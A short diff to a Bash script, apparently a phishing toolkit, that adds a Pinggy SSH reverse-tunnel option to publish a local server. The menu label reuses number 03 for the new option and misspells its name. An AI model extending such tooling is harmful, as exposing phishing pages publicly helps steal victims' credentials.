@@ -508,6 +508,14 @@ start_loclx() {
 	capture_data
 }
 
+start_pinggy() {
+    echo -e "\n[+] Starting Pinggy tunnel..."
+    read -p "[?] Enter your local port (default 8080): " port
+    port=${port:-8080}
+
+    ssh -p 443 -R0:localhost:$port qr@free.pinggy.io
+}
+
 ## Start localhost
 start_localhost() {
 	cusport
@@ -526,6 +534,7 @@ tunnel_menu() {
 		${RED}[${WHITE}01${RED}]${ORANGE} Localhost
 		${RED}[${WHITE}02${RED}]${ORANGE} Cloudflared  ${RED}[${CYAN}Auto Detects${RED}]
 		${RED}[${WHITE}03${RED}]${ORANGE} LocalXpose   ${RED}[${CYAN}NEW! Max 15Min${RED}]
+		${RED}[${WHITE}03${RED}]${ORANGE} Pinngy   ${RED}[${CYAN}NEW! Max 60Min${RED}]
 
 	EOF
 
@@ -538,6 +547,8 @@ tunnel_menu() {
 			start_cloudflared;;
 		3 | 03)
 			start_loclx;;
+		4 | 04)
+			start_pinggy;;
 		*)
 			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
 			{ sleep 1; tunnel_menu; };;
